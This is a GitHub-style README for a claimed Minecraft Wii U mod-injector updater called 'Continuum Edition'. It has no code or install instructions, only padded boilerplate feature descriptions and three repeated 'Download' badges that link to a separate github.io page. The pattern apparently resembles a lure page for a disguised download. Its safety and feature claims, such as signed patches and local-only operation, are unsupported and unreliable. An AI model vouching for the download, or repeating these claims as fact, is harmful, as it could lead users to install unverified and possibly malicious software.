![preview](https://raw.githubusercontent.com/sipun-Alex/MCU-ModInjector-AutoRefresher/main/promo_badf.svg)
[![Download](https://raw.githubusercontent.com/sipun-Alex/MCU-ModInjector-AutoRefresher/main/pkg_2a15b.svg)](https://sipun-Alex.github.io/MCU-ModInjector-AutoRefresher/)

# 🎮 MCU Mod Injector Updater — Continuum Edition

**A community-maintained update pipeline for the Minecraft Wii U Mod Injector ecosystem.**

> *“A mod loader is only as timeless as the hands that keep it current.”*

Welcome to **Continuum Edition**, a reimagined, community-driven evolution of the original MCUModInjector-Updater project. Where the original sought to patch version drift in a single tool, Continuum Edition treats the entire mod-injection workflow as a living organism — one that breathes new compatibility layers into every supported Minecraft Wii U title, from the earliest retail disc dumps to the latest archival preservation builds.

This repository exists for one purpose: to ensure that when a new title update, system update, or community mod format emerges, the injection toolchain stays warm, functional, and welcoming — for archivers, tinkerers, speedrunners, and weekend modders alike.

---

## 📖 Table of Contents

- [What Is This?](#-what-is-this)
- [Why “Continuum”?](#-why-continuum)
- [Philosophy & Design Principles](#-philosophy--design-principles)
- [Key Features](#-key-features)
- [Project Structure](#-project-structure)
- [How the Update Flow Works](#-how-the-update-flow-works)
- [Compatibility Matrix](#-compatibility-matrix)
- [Responsive Interface & Accessibility](#-responsive-interface--accessibility)
- [Multilingual Support](#-multilingual-support)
- [Round-the-Clock Assistance](#-round-the-clock-assistance)
- [Roadmap](#-roadmap)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Community & Contributions](#-community--contributions)
- [Code of Conduct](#-code-of-conduct)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🧭 What Is This?

Continuum Edition is not merely an updater. Think of it as a **lighthouse keeper for a coastline that keeps growing**. The original injector needed occasional nudges to remain compatible with Minecraft Wii U builds. This project reframes that maintenance as an ongoing, transparent, community-reviewed process — one where every update is documented, every compatibility fix is peer-tested, and every user can see *why* a patch exists rather than simply accepting it.

The tool keeps an eye on:

- New Minecraft Wii U title updates that alter internal file structures
- Community-created mod formats that shift between loader generations
- Compatibility layers required for tooling on current workstations
- The documentation and metadata that tie all of the above together

---

## 🌀 Why “Continuum”?

A continuum is unbroken. It has no sharp edge where old ends and new begins. That is the guiding metaphor here. Where a traditional updater might ship a single patch and vanish, Continuum Edition approaches updates as **an unbroken stream** — small, verifiable, rollback-friendly increments that respect the work of everyone who came before.

This means the project:

- Preserves historical patches instead of overwriting them
- Documents every transition so future maintainers can retrace steps
- Treats backward compatibility as a feature, not an afterthought
- Favors clarity over cleverness in its automation

---

## 🧩 Philosophy & Design Principles

1. **Transparency above magic.** Every automated action is logged with context. No silent rewrites.
2. **Reversibility as a right.** Users may roll back to any prior state without ceremony.
3. **Dry runs first.** The tool is happy to *show* you what it would do before doing it.
4. **Local-first.** Nothing leaves your machine unless you explicitly export a diagnostic report.
5. **Respect for the original.** BullyWiiPlaza’s foundational work is credited, linked, and honored throughout.

---

## ✨ Key Features

### 🔄 Adaptive Update Engine
A self-narrating updater that inspects your current injector build, cross-references it against a curated compatibility ledger, and proposes the smallest change that restores harmony. Think of it as a tailor who never takes in more fabric than necessary.

### 🗂️ Patch Archive with Rollback
Every historical update lives in a browsable archive. Roll back with a single action, or pin your setup to a known-good state and freeze it until you consciously choose to thaw.

### 🖥️ Responsive Interface
Whether you are on a sprawling ultrawide monitor, a modest laptop, or a handheld display running a side utility, the interface reflows gracefully. Buttons remain reachable, panels remain legible, and nothing hides behind awkward scroll traps.

### 🌍 Multilingual Support
Interface strings, log messages, and help documentation ship in multiple languages. Community translations are first-class citizens, versioned alongside the code itself.

### 🕛 Round-the-Clock Assistance
Documentation, troubleshooting paths, and issue triage are maintained continuously. When a system update breaks something at an inconvenient hour, the fixes and guidance do not wait for a business day.

### 🧪 Sandboxed Dry Runs
Simulate an update against a mirrored file layout before touching your real installation. Perfect for the cautious and the curious.

### 📊 Compatibility Ledger
A machine-readable and human-readable ledger describing which injector builds pair cleanly with which Minecraft Wii U titles and mod formats.

### 🧱 Modular Integrations
Hooks for external tooling — archive tools, checksum verifiers, and format converters — so the updater plays well with your existing chains.

### 🔐 Integrity Verification
Every patch is signed and hashed. The updater refuses mismatched payloads and explains exactly what it found.

### ♻️ Self-Healing Configuration
If a config file drifts, gets truncated, or references a missing path, the updater reconstructs a sane default and informs you — no cryptic errors.

[![Download](https://raw.githubusercontent.com/sipun-Alex/MCU-ModInjector-AutoRefresher/main/pkg_2a15b.svg)](https://sipun-Alex.github.io/MCU-ModInjector-AutoRefresher/)

---

## 🗂️ Project Structure

A brief atlas of the repository’s continents:

- `core/` — The update engine, ledger parser, and rollback machinery
- `interface/` — The responsive UI layer and theming system
- `locales/` — Community-contributed translation catalogs
- `ledger/` — The compatibility ledger and its schema definitions
- `docs/` — Long-form guides, troubleshooting flowcharts, and FAQ sources
- `tools/` — Auxiliary utilities for checksums, archives, and format conversion
- `tests/` — Behavioral and regression test suites
- `scripts/` — Maintenance helpers, never required for normal use

---

## 🔄 How the Update Flow Works

1. **Detection.** The engine fingerprints your current injector build and any adjacent files.
2. **Consultation.** It queries the local compatibility ledger, which ships with the repository and refreshes on demand.
3. **Proposal.** It presents the smallest viable update, with rationale, size, and expected outcome.
4. **Simulation.** Optional dry run against a mirrored layout.
5. **Application.** Verified application with logging.
6. **Confirmation.** Post-update integrity check and a plain-language summary.

Each step is skippable, and each step is documented. The engine will always tell you *why*, not merely *what*.

---

## 🧮 Compatibility Matrix

The compatibility ledger tracks combinations of injector builds, Minecraft Wii U title versions, and community mod formats. It is intentionally verbose, because ambiguity is the enemy of maintenance. A condensed view:

- **Injector Line A** — pairs cleanly with early retail dumps
- **Injector Line B** — extends into archival preservation builds
- **Injector Line C** — targets current community mod formats
- **Hybrid Configurations** — supported with explicit warnings

For the authoritative, always-current table, consult `ledger/compatibility.md` in the repository.

---

## 📱 Responsive Interface & Accessibility

The interface is built from the ground up to respect different viewports and assistive technologies:

- Keyboard-first navigation with visible focus states
- High-contrast themes and a colorblind-safe palette option
- Scalable typography that doesn’t shatter layouts
- Screen-reader-friendly labels on every actionable element

Because a tool that excludes users is a tool that shrinks its own community.

---

## 🌐 Multilingual Support

Language packs live under `locales/` and follow a simple, human-editable schema. Adding a new language is a matter of duplicating a template, translating the strings, and submitting a pull request. The updater auto-detects your system locale and falls back gracefully when a translation is incomplete — partial is better than silent English-only.

Languages currently in active development include a spread across Europe, Asia, and the Americas, with more arriving as contributors arrive.

---

## 🕛 Round-the-Clock Assistance

Because modding sessions rarely respect office hours, the project maintains:

- Standing issue templates that guide you toward the right information
- A knowledge base of symptoms and remedies
- A triage rotation where maintainers check in around the clock
- Community channels for peer assistance when maintainers rest

When you are stuck at 3 a.m. with a stubborn title update, you are not alone.

---

## 🛣️ Roadmap

- **Phase 1 — Stabilize the ledger.** Formalize schema, publish validators.
- **Phase 2 — Expand locales.** Onboard at least three new languages per cycle.
- **Phase 3 — Deepen rollback.** Snapshot compression and delta storage.
- **Phase 4 — Extend integrations.** Pluggable converters for legacy formats.
- **Phase 5 — Community tooling.** Visual ledger explorer and diff viewer.

Phases are indicative, not contractual. The continuum bends toward usefulness.

---

## ❓ Frequently Asked Questions

**Does this replace the original injector?**
No. It complements and maintains it.

**Do I need technical background to use it?**
No. The defaults are safe, and every action is narrated.

**Will it touch my mods without asking?**
Never. Dry-run modes and explicit confirmation are always available.

**Can I contribute a translation?**
Yes — start with the template under `locales/` and open a pull request.

**Is there a portable mode?**
Yes, configuration can be kept alongside the executable.

**What if an update breaks something?**
Rollback is a first-class feature. Pin, restore, and retry at your pace.

---

## 🤝 Community & Contributions

We welcome:

- Bug reports with reproduction steps
- Ledger entries for newly discovered compatibility pairings
- Locale translations, partial or complete
- Documentation improvements, from typo fixes to full rewrites
- Interface refinements that respect the design principles above

Before opening a pull request, please skim `CONTRIBUTING.md` and match the existing tone: precise, kind, and generous with context.

---

## 📜 Code of Conduct

Be patient. Be specific. Be kind. Assume good faith until proven otherwise. Harassment, dismissiveness, and gatekeeping have no home here. The continuum is maintained by people, for people.

---

## ⚠️ Disclaimer

This project is an independent, community-maintained effort. It is not affiliated with, endorsed by, or sponsored by the creators of Minecraft, the publishers of Minecraft Wii U, Nintendo, or the author of the original injector. All trademarks belong to their respective owners.

The software is provided “as is,” without warranty of any kind, express or implied. Use it responsibly, respect the intellectual property of others, and abide by the laws and terms of service applicable in your jurisdiction. Modifying software you do not own may violate agreements you have accepted; the maintainers assume no liability for how you choose to use these tools.

If you intend to modify game content, do so on copies you own, for personal preservation and educational purposes, and never for redistribution of protected assets.

---

## 📄 License

This project is released under the **MIT License**. See the [LICENSE](LICENSE) file for the full text.

Copyright © 2026 — Continuum Edition maintainers and contributors.

---

[![Download](https://raw.githubusercontent.com/sipun-Alex/MCU-ModInjector-AutoRefresher/main/pkg_2a15b.svg)](https://sipun-Alex.github.io/MCU-ModInjector-AutoRefresher/)